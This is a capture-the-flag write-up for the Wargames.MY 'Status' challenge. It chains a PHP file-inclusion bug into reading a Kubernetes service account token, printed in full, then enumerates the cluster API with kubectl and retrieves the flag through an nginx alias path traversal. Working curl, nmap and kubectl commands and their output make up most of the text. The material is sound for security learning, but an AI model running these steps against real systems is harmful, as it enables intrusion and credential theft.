# Status [2 Solves]

## Description

> If you haven't already, I'd suggest you to warm up first.
>
> <http://warmup.wargames.my/api/status.php>

## Flag

wgmy{21c47f8225240bd1b87e9060986ddb4f}

## TL;DR

- Leak Kubernetes Service Account token
- Identify the flag location by Deployment Information
- Nginx Alias Misconfiguration

This solution exploits the Warmup LFI not Shell.

## Initial Analysis

Continuation of [Warmup - Web](../Warmup_-_Web/index.md).
In the Warmup challenge, I could exploit LFI.
In the current Status challenge, a new URL path, /api/status.php, is provided, so I will get the code for status.php.

```console
$ curl -s -k -o - https://warmup.wargames.my/api/4aa22934982f984b8a0438b701e8dec8.php?x=php://filter/zlib.deflate/resource=status.php | php -r 'echo gzinflate(file_get_contents("php://stdin"));'
<?php

error_reporting(0);

$ok = exec('kubectl -n wgmy get deploy ' . getenv('DEPLOY') . ' -o jsonpath="{.status.availableReplicas}"');

echo($ok ? 'ok' : 'not ok');
```

The `kubectl` command is used to get the status of the Deployment in the wgmy namespace, and the healthcheck results are returned based on that.

```console
$ curl -s -k -o - https://warmup.wargames.my/api/4aa22934982f984b8a0438b701e8dec8.php?x=php://filter/zlib.deflate/resource=/etc/hosts | php -r 'echo gzinflate(file_get_contents("php://stdin"));'
# Kubernetes-managed hosts file.
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
10.42.0.19      wgmy-webtestonetwothree-backend-7bc587fcd8-tpjsv
```

Also, tried to get /etc/hosts, this Warmup is named wgmy-webtestonetwothree-backend-7bc587fcd8-tpjsv.

With `backend` in the name, and I guessed that it is a pod running on a Kubernetes (k8s) cluster.
I will gather an information related to Kubernetes.

## Kubernetes API

I refer to [PayloadsAllTheThings/Kubernetes](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Kubernetes#service-account) and try to get information about the Service Account.

```console
$ curl -s -k -o - -w '\n' "https://warmup.wargames.my/api/4aa22934982f984b8a0438b701e8dec8.php?x=/var/run/secrets/kubernetes.io/serviceaccount/token"
eyJhbGciOiJSUzI1NiIsImtpZCI6Im5oUXBoT0FLNVY5U2llMDR2ZFpfeDByYlpCVEtRQlVDUlBjaWZjVFowVWsifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzM0MzI2MDA5LCJpYXQiOjE3MDI3OTAwMDksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJ3Z215IiwicG9kIjp7Im5hbWUiOiJ3Z215LXdlYnRlc3RvbmV0d290aHJlZS1iYWNrZW5kLTdiYzU4N2ZjZDgtdDRyZnIiLCJ1aWQiOiIwYjU1NWUwMi1iOThmLTQyNzctOWQ4MC1mZDliZjkxNGFhMTcifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6IndnbXktd2VidGVzdG9uZXR3b3RocmVlLWJhY2tlbmQiLCJ1aWQiOiJmN2Y0Mzk1ZC1iNDZlLTRiNzktOWIyYS1iNzgzMjdlZmUwNTEifSwid2FybmFmdGVyIjoxNzAyNzkzNjE2fSwibmJmIjoxNzAyNzkwMDA5LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6d2dteTp3Z215LXdlYnRlc3RvbmV0d290aHJlZS1iYWNrZW5kIn0.ir_i-8Df-mSlkCrQqpTSgd4_GJRbXFKfD1rDghef2El45VyExsRZsfz3DHI7R3tLD3H5ZK-xDj2BB9dXaLqetHW2XhrSs3TYsITdafEaPpb316XUCobxi4w-rJPcA8qR3d1cjvyxxQjkOKubt4B2IKQpPHHwD6RgW1x2JYVKz_3sCCt7A-PkPldtUvsD2X0XlLs7xFm9agS9c2dLxh7yZAHovCtD71WHX-JTeBtOcAXoPWmyq0RgLkorGmhOQf98ZtG88NxDk_fIXeR9CQgdAt__DMi2ryUWD4fvxkAVgGhLsxJhgnXvaHnUVc7_lzfCgkTrEtpt5PELIjyVhZieBg

$ # check jwt
$ TOKEN=eyJ...Bg

$ python3 ~/tools/jwt_tool/jwt_tool.py $TOKEN
...
=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "RS256"
[+] kid = "nhQphOAK5V9Sie04vdZ_x0rbZBTKQBUCRPcifcTZ0Uk"

Token payload values:
[+] aud = ['https://kubernetes.default.svc.cluster.local', 'k3s']
[+] exp = 1734326009    ==> TIMESTAMP = 2024-12-16 14:13:29 (UTC)
[+] iat = 1702790009    ==> TIMESTAMP = 2023-12-17 14:13:29 (UTC)
[+] iss = "https://kubernetes.default.svc.cluster.local"
[+] kubernetes.io = JSON object:
    [+] namespace = "wgmy"
    [+] pod = "OrderedDict([('name', 'wgmy-webtestonetwothree-backend-7bc587fcd8-t4rfr'), ('uid', '0b555e02-b98f-4277-9d80-fd9bf914aa17')])"
    [+] serviceaccount = "OrderedDict([('name', 'wgmy-webtestonetwothree-backend'), ('uid', 'f7f4395d-b46e-4b79-9b2a-b78327efe051')])"
    [+] warnafter = 1702793616
[+] nbf = 1702790009    ==> TIMESTAMP = 2023-12-17 14:13:29 (UTC)
[+] sub = "system:serviceaccount:wgmy:wgmy-webtestonetwothree-backend"

Seen timestamps:
[*] exp was seen
[*] iat is earlier than exp by: 365 days, 0 hours, 0 mins
[*] nbf is earlier than exp by: 365 days, 0 hours, 0 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

I could get the Service Account Token.

- [Pentesting Kubernetes Services - HackTricks Cloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/pentesting-kubernetes-services)

  > | Port     | Process        | Description         |
  > |----------|----------------|---------------------|
  > | 6443/TCP | kube-apiserver | Kubernetes API port |

```console
$ nmap --min-rate 5000 --open -p 443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 warmup.wargames.my
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 14:46 JST
Nmap scan report for warmup.wargames.my (4.193.152.114)
Host is up (0.094s latency).
Not shown: 14 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
443/tcp  open  https
6443/tcp open  sun-sr-https

Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds

$ curl -D- -k https://warmup.wargames.my:6443/
HTTP/2 401
audit-id: faca3601-daf5-418f-8180-f0aefea9c402
cache-control: no-cache, private
content-type: application/json
content-length: 157
date: Sun, 17 Dec 2023 05:46:56 GMT

{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
```

6443/TCP is open so I can call the Kubernetes API.

## Deployment and ConfigMap

I refer to [Kubernetes Enumeration - HackTricks Cloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration#using-curl) and gather an information.

```console
$ alias k='kubectl --token=$TOKEN --server=https://warmup.wargames.my:6443 --insecure-skip-tls-verify=true'

$ k auth can-i --list -n wgmy
Resources                                       Non-Resource URLs                      Resource Names                       Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []                                   [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []                                   [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []                                   [create]
                                                [/.well-known/openid-configuration/]   []                                   [get]
                                                [/.well-known/openid-configuration]    []                                   [get]
                                                [/api/*]                               []                                   [get]
                                                [/api]                                 []                                   [get]
                                                [/apis/*]                              []                                   [get]
                                                [/apis]                                []                                   [get]
                                                [/healthz]                             []                                   [get]
                                                [/healthz]                             []                                   [get]
                                                [/livez]                               []                                   [get]
                                                [/livez]                               []                                   [get]
                                                [/openapi/*]                           []                                   [get]
                                                [/openapi]                             []                                   [get]
                                                [/openid/v1/jwks/]                     []                                   [get]
                                                [/openid/v1/jwks]                      []                                   [get]
                                                [/readyz]                              []                                   [get]
                                                [/readyz]                              []                                   [get]
                                                [/version/]                            []                                   [get]
                                                [/version/]                            []                                   [get]
                                                [/version]                             []                                   [get]
                                                [/version]                             []                                   [get]
configmaps                                      []                                     []                                   [get]
deployments.apps                                []                                     [wgmy-webtestonetwothree-frontend]   [get]
```

I will get an information about the Deployment named wgmy-webtestonetwothree-frontend and its related resources.

<details><summary>wgmy-webtestonetwothree-frontend Deployment</summary>

```console
$ k -n wgmy get deployment wgmy-webtestonetwothree-frontend -o yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  annotations:
    deployment.kubernetes.io/revision: "1"
    meta.helm.sh/release-name: wgmy-webtestonetwothree
    meta.helm.sh/release-namespace: wgmy
  creationTimestamp: "2023-12-15T14:14:18Z"
  generation: 1
  labels:
    app.kubernetes.io/instance: wgmy-webtestonetwothree
    app.kubernetes.io/managed-by: Helm
    app.kubernetes.io/name: frontend
    app.kubernetes.io/version: 0.1.0
    helm.sh/chart: frontend-0.1.0
  managedFields:
  - apiVersion: apps/v1
    fieldsType: FieldsV1
    fieldsV1:
      f:metadata:
        f:annotations:
          .: {}
          f:meta.helm.sh/release-name: {}
          f:meta.helm.sh/release-namespace: {}
        f:labels:
          .: {}
          f:app.kubernetes.io/instance: {}
          f:app.kubernetes.io/managed-by: {}
          f:app.kubernetes.io/name: {}
          f:app.kubernetes.io/version: {}
          f:helm.sh/chart: {}
      f:spec:
        f:progressDeadlineSeconds: {}
        f:replicas: {}
        f:revisionHistoryLimit: {}
        f:selector: {}
        f:strategy:
          f:rollingUpdate:
            .: {}
            f:maxSurge: {}
            f:maxUnavailable: {}
          f:type: {}
        f:template:
          f:metadata:
            f:annotations:
              .: {}
              f:vault.hashicorp.com/agent-inject: {}
              f:vault.hashicorp.com/agent-inject-secret-flag: {}
              f:vault.hashicorp.com/role: {}
            f:labels:
              .: {}
              f:app.kubernetes.io/instance: {}
              f:app.kubernetes.io/name: {}
          f:spec:
            f:containers:
              k:{"name":"frontend"}:
                .: {}
                f:image: {}
                f:imagePullPolicy: {}
                f:livenessProbe:
                  .: {}
                  f:failureThreshold: {}
                  f:httpGet:
                    .: {}
                    f:path: {}
                    f:port: {}
                    f:scheme: {}
                  f:periodSeconds: {}
                  f:successThreshold: {}
                  f:timeoutSeconds: {}
                f:name: {}
                f:ports:
                  .: {}
                  k:{"containerPort":80,"protocol":"TCP"}:
                    .: {}
                    f:containerPort: {}
                    f:name: {}
                    f:protocol: {}
                f:readinessProbe:
                  .: {}
                  f:failureThreshold: {}
                  f:httpGet:
                    .: {}
                    f:path: {}
                    f:port: {}
                    f:scheme: {}
                  f:periodSeconds: {}
                  f:successThreshold: {}
                  f:timeoutSeconds: {}
                f:resources: {}
                f:securityContext: {}
                f:terminationMessagePath: {}
                f:terminationMessagePolicy: {}
                f:volumeMounts:
                  .: {}
                  k:{"mountPath":"/etc/nginx/conf.d"}:
                    .: {}
                    f:mountPath: {}
                    f:name: {}
                  k:{"mountPath":"/usr/share/nginx/.lemme_try_hiding_flag_with_dot_in_front"}:
                    .: {}
                    f:mountPath: {}
                    f:name: {}
                  k:{"mountPath":"/usr/share/nginx/html"}:
                    .: {}
                    f:mountPath: {}
                    f:name: {}
            f:dnsPolicy: {}
            f:restartPolicy: {}
            f:schedulerName: {}
            f:securityContext: {}
            f:serviceAccount: {}
            f:serviceAccountName: {}
            f:terminationGracePeriodSeconds: {}
            f:volumes:
              .: {}
              k:{"name":"conf"}:
                .: {}
                f:configMap:
                  .: {}
                  f:defaultMode: {}
                  f:name: {}
                f:name: {}
              k:{"name":"flag"}:
                .: {}
                f:name: {}
                f:secret:
                  .: {}
                  f:defaultMode: {}
                  f:items: {}
                  f:secretName: {}
              k:{"name":"html"}:
                .: {}
                f:configMap:
                  .: {}
                  f:defaultMode: {}
                  f:name: {}
                f:name: {}
    manager: helm
    operation: Update
    time: "2023-12-15T14:14:18Z"
  - apiVersion: apps/v1
    fieldsType: FieldsV1
    fieldsV1:
      f:metadata:
        f:annotations:
          f:deployment.kubernetes.io/revision: {}
      f:status:
        f:availableReplicas: {}
        f:conditions:
          .: {}
          k:{"type":"Available"}:
            .: {}
            f:lastTransitionTime: {}
            f:lastUpdateTime: {}
            f:message: {}
            f:reason: {}
            f:status: {}
            f:type: {}
          k:{"type":"Progressing"}:
            .: {}
            f:lastTransitionTime: {}
            f:lastUpdateTime: {}
            f:message: {}
            f:reason: {}
            f:status: {}
            f:type: {}
        f:observedGeneration: {}
        f:readyReplicas: {}
        f:replicas: {}
        f:updatedReplicas: {}
    manager: k3s
    operation: Update
    subresource: status
    time: "2023-12-15T14:14:20Z"
  name: wgmy-webtestonetwothree-frontend
  namespace: wgmy
  resourceVersion: "1797"
  uid: a8c63194-0eb2-4005-abe2-14138c2b615b
spec:
  progressDeadlineSeconds: 600
  replicas: 1
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      app.kubernetes.io/instance: wgmy-webtestonetwothree
      app.kubernetes.io/name: frontend
  strategy:
    rollingUpdate:
      maxSurge: 25%
      maxUnavailable: 25%
    type: RollingUpdate
  template:
    metadata:
      annotations:
        vault.hashicorp.com/agent-inject: "true"
        vault.hashicorp.com/agent-inject-secret-flag: kv/data/flag_for_secret
        vault.hashicorp.com/role: wgmy
      creationTimestamp: null
      labels:
        app.kubernetes.io/instance: wgmy-webtestonetwothree
        app.kubernetes.io/name: frontend
    spec:
      containers:
      - image: nginx:1.25-alpine
        imagePullPolicy: IfNotPresent
        livenessProbe:
          failureThreshold: 3
          httpGet:
            path: /
            port: http
            scheme: HTTP
          periodSeconds: 10
          successThreshold: 1
          timeoutSeconds: 1
        name: frontend
        ports:
        - containerPort: 80
          name: http
          protocol: TCP
        readinessProbe:
          failureThreshold: 3
          httpGet:
            path: /
            port: http
            scheme: HTTP
          periodSeconds: 10
          successThreshold: 1
          timeoutSeconds: 1
        resources: {}
        securityContext: {}
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /usr/share/nginx/html
          name: html
        - mountPath: /etc/nginx/conf.d
          name: conf
        - mountPath: /usr/share/nginx/.lemme_try_hiding_flag_with_dot_in_front
          name: flag
      dnsPolicy: ClusterFirst
      restartPolicy: Always
      schedulerName: default-scheduler
      securityContext: {}
      serviceAccount: wgmy-webtestonetwothree-frontend
      serviceAccountName: wgmy-webtestonetwothree-frontend
      terminationGracePeriodSeconds: 30
      volumes:
      - configMap:
          defaultMode: 420
          name: wgmy-webtestonetwothree-frontend-html
        name: html
      - configMap:
          defaultMode: 420
          name: wgmy-webtestonetwothree-frontend-conf
        name: conf
      - name: flag
        secret:
          defaultMode: 420
          items:
          - key: flag
            path: flag_for_status
          secretName: wgmy-webtestonetwothree-frontend-flag
status:
  availableReplicas: 1
  conditions:
  - lastTransitionTime: "2023-12-15T14:14:20Z"
    lastUpdateTime: "2023-12-15T14:14:20Z"
    message: Deployment has minimum availability.
    reason: MinimumReplicasAvailable
    status: "True"
    type: Available
  - lastTransitionTime: "2023-12-15T14:14:18Z"
    lastUpdateTime: "2023-12-15T14:14:20Z"
    message: ReplicaSet "wgmy-webtestonetwothree-frontend-556ccd7cf" has successfully
      progressed.
    reason: NewReplicaSetAvailable
    status: "True"
    type: Progressing
  observedGeneration: 1
  readyReplicas: 1
  replicas: 1
  updatedReplicas: 1
```

</details>

<details><summary>wgmy-webtestonetwothree-frontend-conf ConfigMap</summary>

```console
$ k -n wgmy get configmaps wgmy-webtestonetwothree-frontend-conf -o yaml
apiVersion: v1
data:
  default.conf: |
    set_real_ip_from  10.42.0.0/16;
    real_ip_header    X-Real-IP;    # from traefik

    server {
      listen       80;
      server_name  _;

      location / {
        root   /usr/share/nginx/html;
        index  index.html;
      }

      location /static {
        alias       /usr/share/nginx/html/;
        add_header  Cache-Control "private, max-age=3600";
      }

      location /api/ {
        include        /etc/nginx/fastcgi_params;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME /var/www$fastcgi_script_name;
        fastcgi_pass   wgmy-webtestonetwothree-backend:9000;
      }

      location /internal-secret/ {
        allow  10.42.0.0/16;
        deny   all;

        proxy_pass  http://vault.vault:8200/;
      }
    }
kind: ConfigMap
metadata:
  annotations:
    meta.helm.sh/release-name: wgmy-webtestonetwothree
    meta.helm.sh/release-namespace: wgmy
  creationTimestamp: "2023-12-15T14:14:18Z"
  labels:
    app.kubernetes.io/instance: wgmy-webtestonetwothree
    app.kubernetes.io/managed-by: Helm
    app.kubernetes.io/name: frontend
    app.kubernetes.io/version: 0.1.0
    helm.sh/chart: frontend-0.1.0
  managedFields:
  - apiVersion: v1
    fieldsType: FieldsV1
    fieldsV1:
      f:data:
        .: {}
        f:default.conf: {}
      f:metadata:
        f:annotations:
          .: {}
          f:meta.helm.sh/release-name: {}
          f:meta.helm.sh/release-namespace: {}
        f:labels:
          .: {}
          f:app.kubernetes.io/instance: {}
          f:app.kubernetes.io/managed-by: {}
          f:app.kubernetes.io/name: {}
          f:app.kubernetes.io/version: {}
          f:helm.sh/chart: {}
    manager: helm
    operation: Update
    time: "2023-12-15T14:14:18Z"
  name: wgmy-webtestonetwothree-frontend-conf
  namespace: wgmy
  resourceVersion: "1726"
  uid: 5a73676b-f509-44b0-8e2d-e921eb4cf7b4
```

</details>

## Flag Location

Excerpt from wgmy-webtestonetwothree-frontend Deployment:

```yaml
        volumeMounts:
        - mountPath: /usr/share/nginx/html
          name: html
        - mountPath: /etc/nginx/conf.d
          name: conf
        - mountPath: /usr/share/nginx/.lemme_try_hiding_flag_with_dot_in_front
          name: flag
...
      volumes:
      - configMap:
          defaultMode: 420
          name: wgmy-webtestonetwothree-frontend-html
        name: html
      - configMap:
          defaultMode: 420
          name: wgmy-webtestonetwothree-frontend-conf
        name: conf
      - name: flag
        secret:
          defaultMode: 420
          items:
          - key: flag
            path: flag_for_status
          secretName: wgmy-webtestonetwothree-frontend-flag
```

There is a Volume named `flag`, and it contains the flag at the path flag_for_status.
This Volume is mounted at `/usr/share/nginx/.lemme_try_hiding_flag_with_dot_in_front`.
Thus, the flag is located at `/usr/share/nginx/.lemme_try_hiding_flag_with_dot_in_front/flag_for_status`.

## Nginx Alias Misconfiguration

Excerpt Nginx configuration default.conf from wgmy-webtestonetwothree-frontend-conf ConfigMap:

```conf
      location /static {
        alias       /usr/share/nginx/html/;
        add_header  Cache-Control "private, max-age=3600";
      }
```

This is vulnerable.
For example, using `/static../foo.txt`, I can get the file `/usr/share/nginx/foo.txt`.
Using this technique, I can obtain the flag for Status located at `/usr/share/nginx/.lemme_try_hiding_flag_with_dot_in_front/flag_for_status`.

Refefenre: [Hunting for Nginx Alias Traversals in the wild](https://labs.hakaioffsec.com/nginx-alias-traversal/)

## Solution

```console
$ curl -k https://warmup.wargames.my/static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_status
wgmy{21c47f8225240bd1b87e9060986ddb4f}
```

## References

- [PayloadsAllTheThings/Kubernetes at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Kubernetes)
- [Abusing Roles/ClusterRoles in Kubernetes - HackTricks Cloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes)
- [Kubernetes Pentest Methodology Part 3](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3)
- [Configure a Pod to Use a ConfigMap \| Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-pod-configmap/)
- [Hunting for Nginx Alias Traversals in the wild](https://labs.hakaioffsec.com/nginx-alias-traversal/)
